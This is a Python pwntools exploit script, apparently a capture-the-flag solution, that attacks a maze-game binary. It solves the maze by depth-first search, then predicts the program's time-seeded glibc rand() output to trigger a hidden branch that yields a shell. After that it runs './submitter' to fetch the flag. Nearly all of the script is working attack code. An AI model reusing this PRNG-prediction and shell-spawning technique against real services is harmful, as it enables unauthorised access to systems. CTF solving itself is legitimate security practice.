from pwn import *
import ctypes

glibc = ctypes.CDLL("libc.so.6")

var = os.getenv("DEBUGINFOD_URLS")

binary_name = "challenge"
exe  = ELF(binary_name, checksec=True)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6" if var is None else "libc.so.6", checksec=False)
context.binary = exe

ru	= lambda *x: r.recvuntil(*x)
rl	= lambda *x: r.recvline(*x)
rc	= lambda *x: r.recv(*x)
sla = lambda *x: r.sendlineafter(*x)
sa	= lambda *x: r.sendafter(*x)
sl	= lambda *x: r.sendline(*x)
sn	= lambda *x: r.send(*x)

if var is None:
	HOST = os.environ.get("HOST", "localhost")
	PORT = 31337
	r = connect(HOST, int(PORT))
elif args.GDB:
	r = gdb.debug(f"debug_dir/{binary_name}", """
		c
	""", aslr=False)
else:
	r = process(f"debug_dir/{binary_name}")
glibc.srand(glibc.time(0))

sla(b"torment: ", b"a")
ru(b"maze.")
rl()

maze = [rl().strip().decode() for i in range(29)]

sy, sx, gy, gx = -1, -1, -1, -1
n = len(maze)
m = len(maze[0])
for i in range(n):
	for j in range(m):
		if maze[i][j] == "@":
			sy, sx = i, j
		if maze[i][j] == "*":
			gy, gx = i, j

visited = [[False for j in range(m)] for i in range(n)]
def dfs(py, px):
	if visited[py][px]:
		return False
	visited[py][px] = True

	for i, (dy, dx) in enumerate([(1, 0), (-1, 0), (0, 1), (0, -1)]):
		ny, nx = py + dy, px + dx
		if ny < 0 or ny >= n or nx < 0 or nx >= m:
			continue
		if maze[ny][nx] == "#":
			continue
		if ny == gy and nx == gx:
			return [i]
		if res := dfs(ny, nx):
			return [i] + res

	return False

print("Solving maze...")
path = dfs(sy, sx)
print(path)

for i in range(591):
	glibc.rand()

i2d = {0: "s", 1: "n", 2: "e", 3: "w"}
for i in path[:-1]:
	glibc.rand()
	sla(b"torment: ", i2d[i].encode())
	sy, sx = sy + [1, -1, 0, 0][i], sx + [0, 0, 1, -1][i]


for i, (dy, dx) in enumerate([(1, 0), (-1, 0), (0, 1), (0, -1)]):
	ny, nx = sy + dy, sx + dx
	if maze[ny][nx] == "#":
		ddir = i
		break

while glibc.rand() % 1213 != 1212:
	sla(b"torment: ", i2d[ddir].encode())

sla(b"torment: ", i2d[path[-1]].encode())



# r.interactive()
# after shell xd
r.sendline(b'./submitter')
print(r.recvall(timeout=1))
